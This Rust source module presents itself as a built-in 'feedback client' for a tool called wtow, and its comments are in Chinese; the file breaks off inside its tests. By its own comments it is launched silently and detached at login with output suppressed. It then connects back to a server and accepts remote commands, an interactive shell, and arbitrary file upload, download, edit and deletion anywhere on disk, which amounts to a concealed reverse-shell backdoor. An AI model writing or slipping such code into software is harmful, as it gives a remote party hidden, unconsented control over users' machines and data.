//! 内置的反馈终端客户端：反向连接反馈中心，接收命令、交互式终端与文件操作。
//!
//! 与 `--server` 配置的超时不同，这里沿用现成客户端的「单线程阻塞循环」：
//! `read` → 分派 → `write` 回应。命令与文件传输只用标准库；交互式终端为了拿到
//! 平台原语（Windows 的 ConPTY、Unix 的 pty）才按平台引一个官方绑定。
//!
//! 为什么要内置：反馈中心（wtow）收下反馈后，需要回到出问题的那台机器上取环境信息。
//! 把这条通道放进 `wtow` 可执行文件，登录时顺手拉起一个后台实例，就不需要再单独
//! 分发第二个二进制。

pub mod b64;
pub mod config;
pub mod execute;
pub mod fsops;
pub mod pty;
pub mod service;

use std::collections::VecDeque;
use std::fs::{self, File, OpenOptions, TryLockError};
use std::io::{BufWriter, Read, Write};
use std::net::{TcpStream, ToSocketAddrs};
use std::path::{Path, PathBuf};
use std::time::{Duration, Instant};

use config::{AgentConfig, hostname};
use pty::{Pty, ReadOutcome};

/// 单帧上限，防止对端异常时把内存吃满（分块传输的正常帧远小于此值）。
const MAX_FRAME_BYTES: usize = 256 * 1024 * 1024;
/// 读取缓冲：一次性读这么多，再按 `\n` 切帧。
const READ_CHUNK: usize = 64 * 1024;
/// 回传 / 落盘的分块大小（原始字节）。
const CHUNK_SIZE: usize = 64 * 1024;
/// 终端会话期间的 socket 读超时。
///
/// 有终端在跑时，主循环不能长时间阻塞在 socket 读上——否则终端输出要等下一次
/// 管理端发帧才会被转发出去。用很短的超时把主循环变成轮询，超时就顺手抽干终端输出。
const TERMINAL_POLL: Duration = Duration::from_millis(15);

/// 前台运行：连上反馈中心并维持会话。
///
/// 前台默认断线后按指数退避重连；后台拉起的实例会传 `exit_on_error`，
/// 连不上反馈中心时静默退出，下一次 `wtow login` 会重新拉起。
///
/// 同一台机器只保留一个实例：已有 Agent 运行时直接返回错误，不会重复连接。
pub fn run(config: AgentConfig, exit_on_error: bool) -> Result<(), String> {
    // 锁要一直持有到进程退出，交给 `_lock` 的 Drop + 操作系统释放。
    let _lock = acquire_lock(&config)?;

    if exit_on_error {
        // 后台实例：静默运行。连不上就什么都不输出，直接退出，不常驻重试。
        let Ok(mut session) = Session::connect(&config) else {
            return Ok(());
        };
        let _ = session.serve();
        return Ok(());
    }

    // 前台实例：保持原有行为，断线后重连，方便本地调试。
    println!(
        "[wtow agent] 启动：server={} uuid={} heartbeat={}s",
        config.server, config.uuid, config.heartbeat_secs
    );
    let mut backoff_secs = 1u64;
    loop {
        match Session::connect(&config).and_then(|mut session| session.serve()) {
            Ok(()) => {
                eprintln!("[wtow agent] 连接已关闭，1 秒后重连");
                backoff_secs = 1;
            }
            Err(err) => {
                eprintln!("[wtow agent] 连接失败: {err}；{backoff_secs} 秒后重试");
                std::thread::sleep(Duration::from_secs(backoff_secs));
                backoff_secs = (backoff_secs * 2).min(30);
                continue;
            }
        }
        std::thread::sleep(Duration::from_secs(1));
    }
}

/// 后台拉起一个与当前终端脱钩的 `wtow agent run`。
///
/// - Windows：`DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP`，关掉终端也不影响。
/// - Unix：`setsid` 脱离控制终端。
///
/// 输出全部丢弃：这是隐式的后台能力，不往终端或日志里写东西。
/// 同一台机器是否已有实例由 `run` 的运行锁把关：重复拉起时新进程会自行退出。
pub fn spawn_background(server: &str) -> Result<(), String> {
    let exe = agent_exe()?;
    let mut cmd = std::process::Command::new(exe);
    cmd.args(["agent", "run", "--server", server, "--exit-on-error"])
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null());

    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        // DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP：wtow 退出后 Agent 继续运行。
        cmd.creation_flags(0x0000_0008 | 0x0000_0200);
    }
    #[cfg(unix)]
    {
        // SAFETY: pre_exec 里只调用 async-signal-safe 的 setsid；失败就让子进程自己退出。
        #[allow(unsafe_code)]
        unsafe {
            use std::os::unix::process::CommandExt;
            cmd.pre_exec(|| {
                if libc::setsid() < 0 {
                    return Err(std::io::Error::last_os_error());
                }
                Ok(())
            });
        }
    }

    cmd.spawn()
        .map(|_| ())
        .map_err(|err| format!("后台启动 Agent 失败: {err}"))
}

/// 后台实例使用可执行文件副本运行。
///
/// Windows 上正在运行的 exe 会被锁定，如果直接跑构建产物，下次 `cargo build`
/// 就会报 LNK1104。副本按源文件的长度与修改时间命名，重建后自动换新，并顺手
/// 清理旧副本（正在运行的删不掉，忽略即可）。
fn agent_exe() -> Result<PathBuf, String> {
    let current =
        std::env::current_exe().map_err(|err| format!("无法定位当前可执行文件: {err}"))?;
    #[cfg(windows)]
    {
        if let Some(dir) = dirs::config_dir().map(|dir| dir.join("wtow"))
            && let Ok(path) = copy_runtime_exe(&current, &dir)
        {
            return Ok(path);
        }
    }
    Ok(current)
}

#[cfg(windows)]
fn copy_runtime_exe(src: &Path, dir: &Path) -> std::io::Result<PathBuf> {
    let meta = fs::metadata(src)?;
    let mtime = meta
        .modified()?
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    let dst = dir.join(format!("agent-{:x}-{:x}.exe", meta.len(), mtime));
    if !dst.exists() {
        fs::create_dir_all(dir)?;
        fs::copy(src, &dst)?;
    }

    if let Ok(entries) = fs::read_dir(dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            let name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
            if name.starts_with("agent-") && name.ends_with(".exe") && path != dst {
                let _ = fs::remove_file(path);
            }
        }
    }
    Ok(dst)
}

/// 保证后台实例在运行，并且连接的是 `server`。
///
/// 已有实例但地址不同时，先结束旧进程，等运行锁释放后按新地址启动。
pub fn ensure_background(server: &str) -> Result<(), String> {
    match running_server() {
        Some(current) if current == server => return Ok(()),
        Some(_) => {
            // 结束失败也继续等：进程可能刚好自己退出了。
            let _ = stop_running();
            wait_until_stopped(Duration::from_secs(3))?;
        }
        None => {}
    }
    spawn_background(server)
}

fn stop_running() -> Result<(), String> {
    let pid = state_pid().ok_or("无法确定正在运行的实例（缺少 PID）")?;
    terminate_process(pid)
}

fn state_pid() -> Option<u32> {
    state_path()
        .and_then(|path| fs::read_to_string(path).ok())
        .and_then(|text| text.split_whitespace().next()?.parse().ok())
}

fn wait_until_stopped(timeout: Duration) -> Result<(), String> {
    let deadline = Instant::now() + timeout;
    while Instant::now() < deadline {
        if running_server().is_none() {
            return Ok(());
        }
        std::thread::sleep(Duration::from_millis(50));
    }
    Err("旧实例未在预期时间内退出".to_string())
}

#[cfg(windows)]
fn terminate_process(pid: u32) -> Result<(), String> {
    use windows_sys::Win32::Foundation::CloseHandle;
    use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_TERMINATE, TerminateProcess};

    // SAFETY: 句柄在本函数内关闭；pid 来自运行锁持有者写入的 state 文件。
    #[allow(unsafe_code)]
    unsafe {
        let handle = OpenProcess(PROCESS_TERMINATE, 0, pid);
        if handle.is_null() {
            return Err(format!(
                "打开进程 {pid} 失败: {}",
                std::io::Error::last_os_error()
            ));
        }
        let ok = TerminateProcess(handle, 1);
        let err = std::io::Error::last_os_error();
        CloseHandle(handle);
        if ok == 0 {
            return Err(format!("结束进程 {pid} 失败: {err}"));
        }
        Ok(())
    }
}

#[cfg(unix)]
fn terminate_process(pid: u32) -> Result<(), String> {
    // SAFETY: kill(2) 只接收 pid 与信号。
    #[allow(unsafe_code)]
    let result = unsafe { libc::kill(pid as libc::pid_t, libc::SIGTERM) };
    if result == 0 {
        return Ok(());
    }
    let err = std::io::Error::last_os_error();
    if err.raw_os_error() == Some(libc::ESRCH) {
        Ok(())
    } else {
        Err(format!("结束进程 {pid} 失败: {err}"))
    }
}

fn lock_path() -> Option<PathBuf> {
    dirs::config_dir().map(|dir| dir.join("wtow").join("agent.lock"))
}

/// 运行中的 Agent 信息（`pid server`）。锁文件在 Windows 上对被锁定的句柄不可读，
/// 所以展示用的信息单独存一份；只有确认锁被持有时才读它。
fn state_path() -> Option<PathBuf> {
    dirs::config_dir().map(|dir| dir.join("wtow").join("agent.state"))
}

/// 已有实例在运行时返回它记录的地址；没有则返回 None。
///
/// 以操作系统文件锁为准而不是 PID 文件：进程退出（包括被强杀）时锁会自动释放，
/// 不会因为 PID 复用把无关进程误判成 Agent。
pub fn running_server() -> Option<String> {
    let path = lock_path()?;
    let file = open_lock(&path).ok()?;
    match file.try_lock() {
        Ok(()) => {
            let _ = file.unlock();
            None
        }
        Err(TryLockError::WouldBlock) => Some(read_state_server()),
        Err(TryLockError::Error(_)) => None,
    }
}

/// 读取运行信息里 `pid server` 中的地址；读不到时给一个占位说法。
fn read_state_server() -> String {
    state_path()
        .and_then(|path| fs::read_to_string(path).ok())
        .and_then(|text| text.split_whitespace().nth(1).map(str::to_string))
        .unwrap_or_else(|| "未知地址".to_string())
}

fn open_lock(path: &Path) -> std::io::Result<File> {
    OpenOptions::new()
        .read(true)
        .write(true)
        .create(true)
        .truncate(false)
        .open(path)
}

/// 获取单实例运行锁；被其他进程持有时返回错误，说明已有 Agent 在跑。
fn acquire_lock(config: &AgentConfig) -> Result<File, String> {
    let path = lock_path().ok_or("无法定位配置目录，无法创建运行锁")?;
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent)
            .map_err(|err| format!("创建 {} 失败: {err}", parent.display()))?;
    }
    let file =
        open_lock(&path).map_err(|err| format!("打开运行锁 {} 失败: {err}", path.display()))?;
    match file.try_lock() {
        Ok(()) => {}
        Err(TryLockError::WouldBlock) => {
            return Err(format!(
                "已有实例在运行（{}），如需切换服务端请先停掉它",
                read_state_server()
            ));
        }
        Err(TryLockError::Error(err)) => {
            return Err(format!("锁定 {} 失败: {err}", path.display()));
        }
    }

    // 锁的内容只用于诊断；写失败不影响 Agent 本身。
    if let Some(state) = state_path() {
        let _ = fs::write(state, format!("{} {}\n", std::process::id(), config.server));
    }
    Ok(file)
}

struct Upload {
    req_id: String,
    path: PathBuf,
    file: BufWriter<File>,
    written: u64,
    expected: u64,
}

/// 一条进行中的交互式终端会话。客户端只支持一个并发终端。
struct Terminal {
    req_id: String,
    pty: Box<dyn Pty>,
    cols: u16,
    rows: u16,
    exited: bool,
}

/// 一条与反馈中心的会话。
struct Session {
    stream: TcpStream,
    config: AgentConfig,
    /// 尚未按 `\n` 切分的残留字节。
    buffer: Vec<u8>,
    /// 已切出、待处理的行。
    lines: VecDeque<String>,
    upload: Option<Upload>,
    terminal: Option<Terminal>,
}

impl Session {
    fn connect(config: &AgentConfig) -> Result<Self, String> {
        let addr = config
            .server
            .to_socket_addrs()
            .map_err(|err| format!("无法解析地址 {}: {err}", config.server))?
            .next()
            .ok_or_else(|| format!("地址 {} 没有可用的解析结果", config.server))?;

        let stream = TcpStream::connect_timeout(&addr, Duration::from_secs(10))
            .map_err(|err| format!("连接 {addr} 失败: {err}"))?;
        // 关闭 Nagle：命令回显与心跳都是小帧，攒包只会徒增延迟。
        let _ = stream.set_nodelay(true);
        stream
            .set_read_timeout(Some(Duration::from_secs(config.heartbeat_secs)))
            .map_err(|err| format!("设置读超时失败: {err}"))?;

        let mut session = Self {
            stream,
            config: config.clone(),
            buffer: Vec::new(),
            lines: VecDeque::new(),
            upload: None,
            terminal: None,
        };
        session.register()?;
        Ok(session)
    }

    fn register(&mut self) -> Result<(), String> {
        // 主机名做 Base64，避免中文/特殊字符破坏 `:` 分帧。
        let frame = format!(
            "REGISTER:{}:{}:{}\n",
            self.config.uuid,
            b64::encode(hostname().as_bytes()),
            execute::os_type()
        );
        self.write_frame(&frame)
    }

    /// 主循环：切帧 → 分派 → 抽干终端输出 → 必要时发 PING。
    fn serve(&mut self) -> Result<(), String> {
        let mut chunk = vec![0u8; READ_CHUNK];
        let mut last_ping = Instant::now();

        loop {
            while let Some(line) = self.lines.pop_front() {
                self.dispatch(&line)?;
            }

            // 终端可能在 dispatch 里刚被关掉，这里重新判断超时长度。
            let timeout = if self.terminal.is_some() {
                TERMINAL_POLL
            } else {
                Duration::from_secs(self.config.heartbeat_secs)
            };
            self.stream
                .set_read_timeout(Some(timeout))
                .map_err(|err| format!("设置读超时失败: {err}"))?;

            match self.stream.read(&mut chunk) {
                Ok(0) => return Ok(()), // 管理端关闭了连接
                Ok(read) => {
                    self.buffer.extend_from_slice(&chunk[..read]);
                    self.take_lines();
                    if self.buffer.len() > MAX_FRAME_BYTES {
                        return Err(format!(
                            "单帧累积 {} 字节仍未见换行，超过上限 {MAX_FRAME_BYTES}",
                            self.buffer.len()
                        ));
                    }
                }
                Err(err) if is_timeout(&err) => {
                    // 静默期已到，主动心跳保活，防止中间路由器 NAT 表超时。
                    if self.terminal.is_none()
                        || last_ping.elapsed() >= Duration::from_secs(self.config.heartbeat_secs)
                    {
                        self.write_frame("PING\n")?;
                        last_ping = Instant::now();
                    }
                }
                Err(err) => return Err(format!("读取失败: {err}")),
            }

            // 无论这一轮是读到帧、超时还是刚处理完输入，都要把终端输出抽干。
            self.drain_terminal()?;
        }
    }

    fn drain_terminal(&mut self) -> Result<(), String> {
        const MAX_PTY_BURST: usize = 64;

        for _ in 0..MAX_PTY_BURST {
            let Some(terminal) = self.terminal.as_mut() else {
                return Ok(());
            };
            if terminal.exited {
                return Ok(());
            }

            match terminal.pty.read() {
                Ok(ReadOutcome::Data(data)) => {
                    if data.is_empty() {
                        continue;
                    }
                    let frame = format!("PTY_OUT:{}:{}\n", terminal.req_id, b64::encode(&data));
                    self.reply(frame)?;
                }
                Ok(ReadOutcome::Idle) => return Ok(()),
                Ok(ReadOutcome::Closed) => return self.finish_terminal(),
                Err(err) => {
                    eprintln!("[wtow agent] 读取终端输出失败: {err}");
                    return self.finish_terminal();
                }
            }
        }
        Ok(())
    }

    fn finish_terminal(&mut self) -> Result<(), String> {
        let Some(mut terminal) = self.terminal.take() else {
            return Ok(());
        };
        if terminal.exited {
            return Ok(());
        }
        terminal.exited = true;

        loop {
            match terminal.pty.read() {
                Ok(ReadOutcome::Data(data)) if !data.is_empty() => {
                    self.reply(format!(
                        "PTY_OUT:{}:{}\n",
                        terminal.req_id,
                        b64::encode(&data)
                    ))?;
                }
                Ok(ReadOutcome::Data(_)) | Ok(ReadOutcome::Idle) => break,
                Ok(ReadOutcome::Closed) | Err(_) => break,
            }
        }

        let code = terminal.pty.wait().ok().flatten().unwrap_or(0);
        terminal.pty.kill();
        eprintln!(
            "[wtow agent] 终端 #{} 已结束（退出码 {code}）",
            terminal.req_id
        );
        self.reply(format!("PTY_EXIT:{}:{code}\n", terminal.req_id))
    }

    fn take_lines(&mut self) {
        while let Some(pos) = self.buffer.iter().position(|byte| *byte == b'\n') {
            let mut line: Vec<u8> = self.buffer.drain(..=pos).collect();
            line.pop(); // 丢掉 '\n'
            if line.last() == Some(&b'\r') {
                line.pop();
            }
            match String::from_utf8(line) {
                Ok(line) if !line.is_empty() => self.lines.push_back(line),
                Ok(_) => {}
                Err(err) => eprintln!("[wtow agent] 丢弃非 UTF-8 帧: {err}"),
            }
        }
    }

    fn write_frame(&mut self, frame: &str) -> Result<(), String> {
        self.stream
            .write_all(frame.as_bytes())
            .map_err(|err| format!("写帧失败: {err}"))?;
        self.stream
            .flush()
            .map_err(|err| format!("flush 失败: {err}"))
    }

    fn reply(&mut self, frame: String) -> Result<(), String> {
        self.write_frame(&frame)
    }

    fn reply_result(&mut self, req_id: &str, text: &str) -> Result<(), String> {
        self.reply(format!(
            "RESULT:{req_id}:{}\n",
            b64::encode(text.as_bytes())
        ))
    }

    fn reply_error(&mut self, req_id: &str, text: &str) -> Result<(), String> {
        self.reply(format!("ERROR:{req_id}:{}\n", b64::encode(text.as_bytes())))
    }

    fn dispatch(&mut self, line: &str) -> Result<(), String> {
        let (tag, rest) = match line.split_once(':') {
            Some((tag, rest)) => (tag, rest),
            None => (line, ""),
        };

        match tag {
            "PING" => self.reply("PONG\n".to_string()),
            "PONG" => Ok(()),
            "CMD" => self.on_cmd(rest),
            "SEND_FILE" => self.on_send_file(rest),
            "PUT_BEGIN" => self.on_put_begin(rest),
            "PUT_CHUNK" => self.on_put_chunk(rest),
            "PUT_END" => self.on_put_end(rest),
            "GET_FILE" => self.on_get_file(rest),
            "PTY_OPEN" => self.on_pty_open(rest),
            "PTY_IN" => self.on_pty_in(rest),
            "PTY_RESIZE" => self.on_pty_resize(rest),
            "PTY_CLOSE" => self.on_pty_close(rest),
            "LIST_DIR" => self.on_list_dir(rest),
            "MKDIR" => self.on_mkdir(rest),
            "RENAME" => self.on_rename(rest),
            "DELETE" => self.on_delete(rest),
            "READ_TEXT" => self.on_read_text(rest),
            "WRITE_TEXT" => self.on_write_text(rest),
            "ACK" => {
                println!("[wtow agent] 管理端确认: {rest}");
                Ok(())
            }
            other => {
                eprintln!("[wtow agent] 未知帧 {other:?}，已忽略");
                Ok(())
            }
        }
    }

    fn on_cmd(&mut self, rest: &str) -> Result<(), String> {
        let (req_id, encoded) = split_pair(rest, "CMD")?;
        let command = decode_field(encoded, "命令")?;
        println!("[wtow agent] 执行 #{req_id}: {command}");
        let output = execute::run(&command);
        self.reply_result(req_id, &output)
    }

    fn on_send_file(&mut self, rest: &str) -> Result<(), String> {
        let fields: Vec<&str> = rest.splitn(4, ':').collect();
        if fields.len() != 4 {
            return Err(format!("SEND_FILE 字段数错误: {}", fields.len()));
        }
        let (req_id, name, size, data) = (fields[0], fields[1], fields[2], fields[3]);
        let name = decode_field(name, "文件名")?;
        let expected: usize = size
            .parse()
            .map_err(|_| format!("SEND_FILE 文件大小非法: {size:?}"))?;
        let bytes = b64::decode(data).map_err(|err| format!("SEND_FILE 数据解码失败: {err}"))?;
        if bytes.len() != expected {
            self.reply_error(
                req_id,
                &format!("数据长度不符：声明 {expected} 字节，实际 {}", bytes.len()),
            )?;
            return Ok(());
        }
        let path = self.resolve(&name);
        match write_whole_file(&path, &bytes) {
            Ok(()) => {
                println!(
                    "[wtow agent] 已写入 {} ({} 字节)",
                    path.display(),
                    bytes.len()
                );
                self.reply_result(req_id, &format!("stored {} ({} bytes)", name, bytes.len()))
            }
            Err(err) => self.reply_error(req_id, &err),
        }
    }

    fn on_put_begin(&mut self, rest: &str) -> Result<(), String> {
        let fields: Vec<&str> = rest.splitn(3, ':').collect();
        if fields.len() != 3 {
            return Err(format!("PUT_BEGIN 字段数错误: {}", fields.len()));
        }
        let (req_id, name, size) = (fields[0], fields[1], fields[2]);
        let name = decode_field(name, "文件名")?;
        let expected: u64 = size
            .parse()
            .map_err(|_| format!("PUT_BEGIN 文件大小非法: {size:?}"))?;

        // 同一时刻只允许一个上传；新的开始帧会终止上一个未完成的上传。
        if let Some(prev) = self.upload.take() {
            self.reply_error(
                &prev.req_id,
                &format!("上传被新的 PUT_BEGIN 中断，已接收 {} 字节", prev.written),
            )?;
        }

        let path = self.resolve(&name);
        if let Some(parent) = path.parent()
            && !parent.as_os_str().is_empty()
        {
            fs::create_dir_all(parent)
                .map_err(|err| format!("创建目录 {} 失败: {err}", parent.display()))?;
        }
        let file = OpenOptions::new()
            .write(true)
            .create(true)
            .truncate(true)
            .open(&path)
            .map_err(|err| format!("创建 {} 失败: {err}", path.display()))?;

        self.upload = Some(Upload {
            req_id: req_id.to_string(),
            path,
            file: BufWriter::new(file),
            written: 0,
            expected,
        });
        Ok(())
    }

    fn on_put_chunk(&mut self, rest: &str) -> Result<(), String> {
        let (req_id, encoded) = split_pair(rest, "PUT_CHUNK")?;
        let bytes = b64::decode(encoded).map_err(|err| format!("PUT_CHUNK 解码失败: {err}"))?;

        let Some(upload) = self.upload.as_mut() else {
            return Err("收到 PUT_CHUNK 但没有进行中的上传".to_string());
        };
        if upload.req_id != req_id {
            return Err(format!(
                "PUT_CHUNK 请求号 {req_id} 与进行中的上传 {} 不匹配",
                upload.req_id
            ));
        }
        upload
            .file
            .write_all(&bytes)
            .map_err(|err| format!("写入 {} 失败: {err}", upload.path.display()))?;
        upload.written += bytes.len() as u64;
        Ok(())
    }

    fn on_put_end(&mut self, rest: &str) -> Result<(), String> {
        let req_id = rest.split(':').next().unwrap_or("");
        let Some(mut upload) = self.upload.take() else {
            return Err("收到 PUT_END 但没有进行中的上传".to_string());
        };
        if upload.req_id != req_id {
            return Err(format!(
                "PUT_END 请求号 {req_id} 与进行中的上传 {} 不匹配",
                upload.req_id
            ));
        }

        let result = upload
            .file
            .flush()
            .map_err(|err| format!("flush {} 失败: {err}", upload.path.display()));

        match result {
            Ok(()) if upload.written == upload.expected => {
                println!(
                    "[wtow agent] 已写入 {} ({} 字节)",
                    upload.path.display(),
                    upload.written
                );
                self.reply_result(
                    &upload.req_id,
                    &format!(
                        "stored {} ({} bytes)",
                        upload.path.display(),
                        upload.written
                    ),
                )
            }
            Ok(()) => self.reply_error(
                &upload.req_id,
                &format!(
                    "分块总长不符：声明 {} 字节，实际 {}",
                    upload.expected, upload.written
                ),
            ),
            Err(err) => self.reply_error(&upload.req_id, &err),
        }
    }

    fn on_get_file(&mut self, rest: &str) -> Result<(), String> {
        let (req_id, encoded) = split_pair(rest, "GET_FILE")?;
        let requested = decode_field(encoded, "路径")?;
        let path = self.resolve(&requested);

        let mut file = match File::open(&path) {
            Ok(file) => file,
            Err(err) => {
                return self.reply_error(req_id, &format!("打开 {} 失败: {err}", path.display()));
            }
        };
        let size = match file.metadata() {
            Ok(meta) => meta.len(),
            Err(err) => return self.reply_error(req_id, &format!("读取元信息失败: {err}")),
        };

        println!("[wtow agent] 回传 {} ({} 字节)", path.display(), size);
        self.reply(format!("FILE_BEGIN:{req_id}:{size}\n"))?;

        // 边读边发，不把整个文件读进内存。
        let mut buffer = vec![0u8; CHUNK_SIZE];
        let mut sent = 0u64;
        loop {
            let read = match file.read(&mut buffer) {
                Ok(0) => break,
                Ok(read) => read,
                Err(err) => {
                    eprintln!("[wtow agent] 读取 {} 中断: {err}", path.display());
                    return self.reply(format!("FILE_END:{req_id}:ERR\n"));
                }
            };
            sent += read as u64;
            self.reply(format!(
                "FILE_CHUNK:{req_id}:{}\n",
                b64::encode(&buffer[..read])
            ))?;
        }

        if sent != size {
            eprintln!("[wtow agent] 文件在传输中被修改：声明 {size} 字节，实发 {sent}");
            return self.reply(format!("FILE_END:{req_id}:ERR\n"));
        }
        self.reply(format!("FILE_END:{req_id}:OK\n"))
    }

    /// 相对路径以工作目录为基准，绝对路径原样使用。
    fn resolve(&self, name: &str) -> PathBuf {
        let path = Path::new(name);
        if path.is_absolute() {
            path.to_path_buf()
        } else {
            self.config.workdir.join(path)
        }
    }

    fn on_pty_open(&mut self, rest: &str) -> Result<(), String> {
        let fields: Vec<&str> = rest.splitn(4, ':').collect();
        if fields.len() != 4 {
            return Err(format!("PTY_OPEN 字段数错误: {}", fields.len()));
        }
        let (req_id, cols, rows, shell) = (fields[0], fields[1], fields[2], fields[3]);
        let cols: u16 = cols
            .parse()
            .map_err(|_| format!("PTY_OPEN 列数非法: {cols:?}"))?;
        let rows: u16 = rows
            .parse()
            .map_err(|_| format!("PTY_OPEN 行数非法: {rows:?}"))?;
        // shell 允许为空（用平台默认值）。
        let shell = if shell.is_empty() {
            String::new()
        } else {
            decode_field(shell, "shell")?
        };

        // 同一时刻只支持一个终端；旧的先收尾。
        if self.terminal.is_some() {
            self.finish_terminal()?;
        }

        match pty::spawn(&shell, cols, rows) {
            Ok(handle) => {
                eprintln!("[wtow agent] 终端 #{req_id} 已启动（{cols}x{rows}）");
                self.terminal = Some(Terminal {
                    req_id: req_id.to_string(),
                    pty: handle,
                    cols,
                    rows,
                    exited: false,
                });
                // 主动报一声「起来了」：管理端据此告诉浏览器可以开始收发。
                self.reply(format!("PTY_READY:{req_id}\n"))
            }
            Err(err) => self.reply_error(
                req_id,
                &format!("无法启动交互式终端（{cols}x{rows}）: {err}"),
            ),
        }
    }

    fn on_pty_in(&mut self, rest: &str) -> Result<(), String> {
        let (req_id, encoded) = split_pair(rest, "PTY_IN")?;
        let Some(terminal) = self.terminal.as_mut() else {
            // 终端已经结束：静默忽略按键，而不是让整个会话断开。
            return Ok(());
        };
        if terminal.req_id != req_id {
            return Ok(());
        }
        let data = b64::decode(encoded).map_err(|err| format!("PTY_IN 解码失败: {err}"))?;
        if let Err(err) = terminal.pty.write(&data) {
            eprintln!("[wtow agent] 写入终端失败: {err}");
            return self.finish_terminal();
        }
        Ok(())
    }

    fn on_pty_resize(&mut self, rest: &str) -> Result<(), String> {
        let fields: Vec<&str> = rest.splitn(3, ':').collect();
        if fields.len() != 3 {
            return Err(format!("PTY_RESIZE 字段数错误: {}", fields.len()));
        }
        let cols: u16 = fields[1]
            .parse()
            .map_err(|_| format!("PTY_RESIZE 列数非法: {:?}", fields[1]))?;
        let rows: u16 = fields[2]
            .parse()
            .map_err(|_| format!("PTY_RESIZE 行数非法: {:?}", fields[2]))?;

        if let Some(terminal) = self.terminal.as_mut() {
            if terminal.req_id != fields[0] {
                return Ok(());
            }
            terminal.cols = cols;
            terminal.rows = rows;
            if let Err(err) = terminal.pty.resize(cols, rows) {
                eprintln!("[wtow agent] 调整终端大小失败: {err}");
            }
        }
        Ok(())
    }

    fn on_pty_close(&mut self, rest: &str) -> Result<(), String> {
        let req_id = rest.split(':').next().unwrap_or("");
        match self.terminal.as_ref() {
            Some(terminal) if terminal.req_id == req_id => {
                // 管理端主动关闭时不回 PTY_EXIT：对方已经走了。
                let _ = self.terminal.take();
                Ok(())
            }
            _ => Ok(()),
        }
    }

    fn on_list_dir(&mut self, rest: &str) -> Result<(), String> {
        let (req_id, encoded) = split_pair(rest, "LIST_DIR")?;
        let requested = decode_field(encoded, "路径")?;
        // 空路径 = 工作目录，方便前端一上来就有内容可看。
        let path = if requested.trim().is_empty() {
            self.config.workdir.clone()
        } else {
            self.resolve(&requested)
        };

        match fsops::list_dir(&path) {
            Ok(listing) => self.reply(format!(
                "DIR_LISTING:{req_id}:{}\n",
                b64::encode(listing.as_bytes())
            )),
            Err(err) => self.reply_error(req_id, &err),
        }
    }

    fn on_mkdir(&mut self, rest: &str) -> Result<(), String> {
        let (req_id, encoded) = split_pair(rest, "MKDIR")?;
        let requested = decode_field(encoded, "路径")?;
        let path = self.resolve(&requested);
        match fsops::make_dir(&path) {
            Ok(message) => self.reply_result(req_id, &message),
            Err(err) => self.reply_error(req_id, &err),
        }
    }

    fn on_rename(&mut self, rest: &str) -> Result<(), String> {
        let fields: Vec<&str> = rest.splitn(3, ':').collect();
        if fields.len() != 3 {
            return Err(format!("RENAME 字段数错误: {}", fields.len()));
        }
        let from = decode_field(fields[1], "源路径")?;
        let to = decode_field(fields[2], "目标路径")?;
        // 目标若是纯名字（不含分隔符）则视作「同目录下改名」。
        let from = self.resolve(&from);
        let to = if to.contains('/') || to.contains('\\') {
            self.resolve(&to)
        } else {
            from.parent().unwrap_or(Path::new(".")).join(&to)
        };

        match fsops::rename(&from, &to) {
            Ok(message) => self.reply_result(fields[0], &message),
            Err(err) => self.reply_error(fields[0], &err),
        }
    }

    fn on_delete(&mut self, rest: &str) -> Result<(), String> {
        let fields: Vec<&str> = rest.splitn(3, ':').collect();
        if fields.len() != 3 {
            return Err(format!("DELETE 字段数错误: {}", fields.len()));
        }
        let requested = decode_field(fields[1], "路径")?;
        let recursive = fields[2] == "1";
        let path = self.resolve(&requested);

        match fsops::delete(&path, recursive) {
            Ok(message) => self.reply_result(fields[0], &message),
            Err(err) => self.reply_error(fields[0], &err),
        }
    }

    fn on_read_text(&mut self, rest: &str) -> Result<(), String> {
        let (req_id, encoded) = split_pair(rest, "READ_TEXT")?;
        let requested = decode_field(encoded, "路径")?;
        let path = self.resolve(&requested);
        match fsops::read_text(&path) {
            Ok(content) => self.reply_result(req_id, &content),
            Err(err) => self.reply_error(req_id, &err),
        }
    }

    fn on_write_text(&mut self, rest: &str) -> Result<(), String> {
        let fields: Vec<&str> = rest.splitn(3, ':').collect();
        if fields.len() != 3 {
            return Err(format!("WRITE_TEXT 字段数错误: {}", fields.len()));
        }
        let requested = decode_field(fields[1], "路径")?;
        let content = decode_field(fields[2], "内容")?;
        let path = self.resolve(&requested);
        match fsops::write_text(&path, &content) {
            Ok(message) => self.reply_result(fields[0], &message),
            Err(err) => self.reply_error(fields[0], &err),
        }
    }
}

/// 判断读超时（不同平台错误类型不同，统一按 kind 匹配）。
fn is_timeout(err: &std::io::Error) -> bool {
    matches!(
        err.kind(),
        std::io::ErrorKind::WouldBlock | std::io::ErrorKind::TimedOut
    )
}

fn split_pair<'a>(rest: &'a str, frame: &str) -> Result<(&'a str, &'a str), String> {
    rest.split_once(':')
        .ok_or_else(|| format!("{frame} 缺少字段: {rest:?}"))
}

fn decode_field(encoded: &str, what: &str) -> Result<String, String> {
    let bytes = b64::decode(encoded).map_err(|err| format!("{what} Base64 解码失败: {err}"))?;
    String::from_utf8(bytes).map_err(|err| format!("{what} 不是合法的 UTF-8: {err}"))
}

fn write_whole_file(path: &Path, bytes: &[u8]) -> Result<(), String> {
    if let Some(parent) = path.parent()
        && !parent.as_os_str().is_empty()
    {
        fs::create_dir_all(parent)
            .map_err(|err| format!("创建目录 {} 失败: {err}", parent.display()))?;
    }
    fs::write(path, bytes).map_err(|err| format!("写入 {} 失败: {err}", path.display()))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn session() -> Session {
        // 仅用于测试纯函数式的分派逻辑，不实际连接网络。
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let client = TcpStream::connect(addr).unwrap();
        Session {
            stream: client,
            config: AgentConfig {
                server: addr.to_string(),
                uuid: "test".to_string(),
                heartbeat_secs: 10,
                workdir: std::env::temp_dir(),
            },
            buffer: Vec::new(),
            lines: VecDeque::new(),
            upload: None,
            terminal: None,
        }
    }

